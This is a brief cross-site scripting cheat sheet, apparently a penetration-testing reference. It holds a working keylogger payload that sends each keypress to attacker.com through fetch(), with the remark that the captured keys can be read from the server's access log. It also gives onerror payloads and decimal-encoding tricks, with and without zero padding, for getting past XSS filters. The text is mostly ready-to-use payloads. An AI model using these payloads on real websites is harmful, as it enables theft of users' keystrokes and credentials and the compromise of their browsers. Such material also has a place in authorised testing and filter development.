XSS (Cross-site Scripting)
======
XSS is a type of attack in which malicious scripts are injected and executed into the victim trusted website.

Simple XSS Keylogger
======
This simple keylogger send an request to the attacker website with the key that was pressed on the page
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com?k="+String.fromCharCode(e.which))}, this.remove();'>
```
To check all the records, simply check your access.log on the server

XSS on EventListeners
======
#### onerror
Trigger the event by sending a malformed src attribute
```html
<img src=x onerror="alert('XSS')">
```

XSS filter evasion
======
#### decimal encode
You can bypass some XSS filters encoding the script with decimal system
```html
<img src=x onerror="&#97&#108&#101&#114&#116&#40&#49&#41">
```

#### decimal encode with padding
To improve the decimal encoding, you can padding the values to complete 7 digits with 0
```html
<img src=x onerror="&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041">
```